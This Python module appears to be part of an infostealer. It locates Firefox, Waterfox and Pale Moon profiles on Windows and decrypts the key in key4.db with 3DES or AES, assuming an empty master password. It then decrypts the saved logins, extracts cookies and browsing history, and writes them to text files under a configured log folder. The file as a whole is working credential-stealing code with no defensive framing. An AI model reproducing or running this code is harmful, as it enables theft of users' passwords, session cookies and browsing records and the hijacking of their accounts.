from base64 import b64decode
from hashlib import sha1, pbkdf2_hmac
from hmac import new
from json import load
from pathlib import Path
from sqlite3 import connect
from os.path import join, exists
from os import environ, sep, mkdir
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from glob import glob
from pyasn1.codec.der.decoder import decode as der_decode
from manager.logger import Log
from Crypto.Cipher import AES, DES3
from preferences.config import config


MAGIC1 = b"\xf8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01"


MAGIC2 = (1, 2, 840, 113_549, 3, 7)
MAGIC3 = (1, 2, 840, 113_549, 1, 12, 5, 1, 3)



def decrypt_aes(decoded_item, master_password, global_salt):
    entry_salt = decoded_item[0][0][1][0][1][0].asOctets()
    iteration_count = int(decoded_item[0][0][1][0][1][1])
    key_length = int(decoded_item[0][0][1][0][1][2])
    assert key_length == 32

    encoded_password = sha1(global_salt + master_password.encode('utf-8')).digest()
    key = pbkdf2_hmac(
        'sha256', encoded_password,
        entry_salt, iteration_count, dklen=key_length)

    init_vector = b'\x04\x0e' + decoded_item[0][0][1][1][1].asOctets()
    encrypted_value = decoded_item[0][1].asOctets()
    cipher = AES.new(key, AES.MODE_CBC, init_vector)
    return cipher.decrypt(encrypted_value)




def decrypt3DES(globalSalt, masterPassword, entrySalt, encryptedData):
    hp = sha1(globalSalt + masterPassword.encode()).digest()
    pes = entrySalt + b"\x00" * (20 - len(entrySalt))
    chp = sha1(hp + entrySalt).digest()
    k1 = new(chp, pes + entrySalt, sha1).digest()
    tk = new(chp, pes, sha1).digest()
    k2 = new(chp, tk + entrySalt, sha1).digest()
    k = k1 + k2
    iv = k[-8:]
    key = k[:24]
    return DES3.new(key, DES3.MODE_CBC, iv).decrypt(encryptedData)


def getKey(directory: Path, masterPassword=""):
    dbfile: Path = directory + "key4.db"

    conn = connect(dbfile)
    c = conn.cursor()
    c.execute("""
        SELECT item1, item2
        FROM metadata
        WHERE id = 'password';
    """)
    row = next(c)
    globalSalt, item2 = row

    try:
        decodedItem2, _ = der_decode(item2)
        encryption_method = '3DES'
        entrySalt = decodedItem2[0][1][0].asOctets()
        cipherT = decodedItem2[1].asOctets()
        clearText = decrypt3DES(
            globalSalt, masterPassword, entrySalt, cipherT
        ) 
    except AttributeError:
        encryption_method = 'AES'
        decodedItem2 = der_decode(item2)
        clearText = decrypt_aes(decodedItem2, masterPassword, globalSalt)


    c.execute("""
        SELECT a11, a102
        FROM nssPrivate
        WHERE a102 = ?;
    """, (MAGIC1,))
    try:
        row = next(c)
        a11, a102 = row
    except StopIteration:
        raise Exception(
            "The Firefox database appears to be broken. Try to add a password to rebuild it."
        )

    if encryption_method == 'AES':
        decodedA11 = der_decode(a11)
        key = decrypt_aes(decodedA11, masterPassword, globalSalt)
    elif encryption_method == '3DES':
        decodedA11, _ = der_decode(a11)
        oid = decodedA11[0][0].asTuple()
        assert oid == MAGIC3, f"The key is encoded with an unknown format {oid}"
        entrySalt = decodedA11[0][1][0].asOctets()
        cipherT = decodedA11[1].asOctets()
        key = decrypt3DES(globalSalt, masterPassword, entrySalt, cipherT)

    return key[:24]

def PKCS7unpad(b):
    return b[: -b[-1]]

def decodeLoginData(key, data):
    asn1data, _ = der_decode(b64decode(data))
    assert asn1data[0].asOctets() == MAGIC1
    assert asn1data[1][0].asTuple() == MAGIC2
    iv = asn1data[1][1].asOctets()
    ciphertext = asn1data[2].asOctets()
    des = DES3.new(key, DES3.MODE_CBC, iv)
    return PKCS7unpad(des.decrypt(ciphertext)).decode()


def exportLogins(key, jsonLogins):
    try:
        if "logins" not in jsonLogins:
            return []
        logins = []
        for row in jsonLogins["logins"]:
            encUsername = row["encryptedUsername"]
            encPassword = row["encryptedPassword"]
            logins.append(
                (
                    row["hostname"],
                    decodeLoginData(key, encUsername),
                    decodeLoginData(key, encPassword),
                )
            )
        passwords = ""
        for login in logins:
            passwords += f"""
URL: {login[0]}
LOGIN: {login[1]}
PASSWORD: {login[2]}
"""
        return passwords
    except Exception as e:
        Log(f"{key},{jsonLogins} logins ---> {e}")
        return passwords


def getJsonLogins(directory):
    with open(directory + "logins.json", "r") as loginf:
        jsonLogins = load(loginf)
    return jsonLogins



def decrypt_value(encrypted_value, key, iv):
    cipher = Cipher(algorithms.AES(key), modes.GCM(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    decrypted_value = decryptor.update(encrypted_value) + decryptor.finalize()
    return decrypted_value.decode('utf-8')


def get_firefox_cookies(profile_path):
    try:
        cookies_path = join(profile_path, 'cookies.sqlite')
        if not exists(cookies_path):
            return None
        cookies = ""
        conn = connect(cookies_path)
        cursor = conn.cursor()
        cursor.execute("SELECT host, name, value, path, datetime(expiry/1000000,'unixepoch') as expiry FROM moz_cookies")
        for row in cursor.fetchall():
            host, name, value, path, expires = row
            cookies += f"{host}\tTRUE\t{path}\tFALSE\t{expires}\t{name}\t{value}\n"
        conn.close()
        return cookies
    except Exception as e:
        Log(f"{profile_path} cookies ---> {e}")
        return cookies

def get_history(directory):
    try:
        history_db_path = directory + "places.sqlite"
        conn = connect(history_db_path)
        cursor = conn.cursor()

        cursor.execute("SELECT url, title, datetime(last_visit_date/1000000,'unixepoch') as last_visit_date FROM moz_places")
        visited_websites = cursor.fetchall()
        data = ""
        for website in visited_websites:
            url = website[0]
            title = website[1]
            last_visit_date = website[2]
            data += f"""
URL: {url}
Title: {title}
Last Visit Date: {last_visit_date}
"""
        return data
    except Exception as e:
        Log(f"{directory} cookies ---> {e}")
        return data





def GeckoDriver():
    msgInfo = ""
    Log("===========GeckoDriver===========")
    appdata = environ['USERPROFILE'] + sep + r'AppData\Roaming'
    user = environ['USERPROFILE']
    pathtofile = f'{user}\\{config.pathToLogs}'

    browsers = {
        "firefox": appdata + "\\Mozilla\\Firefox\\Profiles",
        "waterfox": appdata + "\\Waterfox\Profiles",
        "palemoon": appdata + "\\Moonchild Productions\\Pale Moon\\Profiles"
    }



    browsers_data = {}
    for key, value in browsers.items():

        matching_folders = glob(join(value, "*default*"))
        i = 0
        for profile_path in matching_folders:
            browsers_data[key+"_"+str(i)] = {}
            profile_path += "\\"
            try:
                browsers_data[key+"_"+str(i)]["Saved_Passwords"] = exportLogins(getKey(profile_path), getJsonLogins(profile_path))
                browsers_data[key+"_"+str(i)]["Browser_Cookies"] = get_firefox_cookies(profile_path)
                browsers_data[key+"_"+str(i)]["Browser_History"] = get_history(profile_path)
            except Exception as e:
                Log(f"{profile_path} global ---> {e}")
            i += 1
            
    if browsers_data:
            if not exists(pathtofile+'\\Browsers\\'):
                mkdir(pathtofile+'\\Browsers\\')

            for browser_name in browsers_data:

                new = True

                if "Saved_Passwords" in browsers_data[browser_name]:
                    if not exists(pathtofile+'\\Browsers\\'+browser_name):
                        mkdir(pathtofile+'\\Browsers\\'+browser_name)
                    with open(f'{pathtofile}\\Browsers\\{browser_name}\\logins.txt', 'w', encoding='UTF-8') as f:
                        f.write(browsers_data[browser_name]['Saved_Passwords'])
                    if new:
                        msgInfo+="\n🔍"+browser_name
                        new = False
                    msgInfo+="\n∟🔑logins"

                if "Browser_History" in browsers_data[browser_name]:
                    if not exists(pathtofile+'\\Browsers\\'+browser_name):
                        mkdir(pathtofile+'\\Browsers\\'+browser_name)
                    with open(f'{pathtofile}\\Browsers\\{browser_name}\\history.txt', 'w', encoding='UTF-8') as f:
                        f.write(browsers_data[browser_name]['Browser_History'])
                    if new:
                        msgInfo+="\n🔍"+browser_name
                        new = False
                    msgInfo+="\n∟📰history"
              
                if "Browser_Cookies" in browsers_data[browser_name]:
                    if not exists(pathtofile+'\\Browsers\\'+browser_name):
                        mkdir(pathtofile+'\\Browsers\\'+browser_name)
                    with open(f'{pathtofile}\\Browsers\\{browser_name}\\cookies.txt', 'w', encoding='UTF-8') as f:
                        f.write(browsers_data[browser_name]['Browser_Cookies'])
                    if new:
                        msgInfo+="\n🔍"+browser_name
                        new = False
                    msgInfo+="\n∟🍪cookies"
                if not new:
                    msgInfo+="\n"
    return msgInfo